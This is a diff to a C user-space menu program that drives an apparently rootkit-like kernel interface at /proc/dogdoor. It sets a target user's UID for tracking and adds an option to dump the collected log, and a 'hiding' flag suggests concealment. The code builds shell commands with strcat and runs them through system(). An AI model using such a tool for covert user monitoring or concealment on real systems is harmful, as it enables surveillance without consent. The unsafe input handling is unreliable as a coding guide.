@@ -16,6 +16,7 @@ int main() {
 //    const char* PROC_PATH = "/proc/dogdoor";
     const char* command_echo1 = "exec echo ";
     const char* command_echo2 = " > /proc/dogdoor";
+    const char* command_cat = "exec cat /proc/dogdoor";
     bool hiding = false;
     while(1) {
         type = mselect();
@@ -23,17 +24,26 @@ int main() {
         if(type == 5) break;
         switch(type) {
         case 1: {
-		printf("user_name: ");
-		scanf("%s",u_name);
-		struct passwd* user_pw;
-		user_pw = getpwnam(u_name);
-		int u_id = user_pw->pw_uid;
-		char u_id_str[20];
-		sprintf(u_id_str, "%d", u_id);
-		strcat(command,command_echo1);
-		strcat(command,"u");
-		strcat(command,u_id_str);
-		strcat(command,command_echo2);
+		printf("1. set user name\n");
+		printf("2. log\n");
+		int ss;
+		scanf("%d",&ss);
+		if(ss == 1) {
+			printf("user_name: ");
+			scanf("%s",u_name);
+			struct passwd* user_pw;
+			user_pw = getpwnam(u_name);
+			int u_id = user_pw->pw_uid;
+			char u_id_str[20];
+			sprintf(u_id_str, "%d", u_id);
+			strcat(command,command_echo1);
+			strcat(command,"u");
+			strcat(command,u_id_str);
+			strcat(command,command_echo2);
+		}
+		else if(ss == 2) {
+			system(command_cat);
+		}
             break;
         }
         case 2: {
